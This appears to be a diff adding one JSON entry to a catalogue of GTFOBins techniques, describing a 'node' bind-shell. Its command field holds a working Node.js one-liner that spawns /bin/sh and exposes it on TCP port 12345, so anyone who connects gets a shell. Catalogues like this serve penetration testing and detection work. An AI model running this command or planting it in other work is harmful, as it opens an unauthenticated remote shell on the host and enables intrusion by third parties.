@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-node-bind-shell",
+  "name": "GTFOBins · node (bind-shell)",
+  "command": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'",
+  "description": "Use node to bind shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "node",
+    "bind-shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/node/#bind-shell",
+  "upstream_id": "node/bind-shell/0",
+  "category": "gtfobins",
+  "subcategory": "bind-shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/node/"
+    }
+  ]
+}
